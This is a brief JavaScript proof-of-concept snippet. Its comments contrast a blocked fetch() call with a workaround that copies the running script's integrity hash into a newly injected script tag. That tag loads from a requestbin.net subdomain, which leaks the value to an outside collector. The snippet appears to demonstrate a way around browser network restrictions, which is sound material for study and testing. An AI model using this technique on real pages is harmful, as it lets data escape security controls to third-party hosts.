// We can't do this...
fetch("https://expect-fail/")

// But we can do this...
const integrity = document.currentScript.integrity;
const script = document.createElement('script');
script.src = "https://hash.a0c834c72c1b14cc7cfe.d.requestbin.net"
script.integrity = integrity;
document.head.appendChild(script);
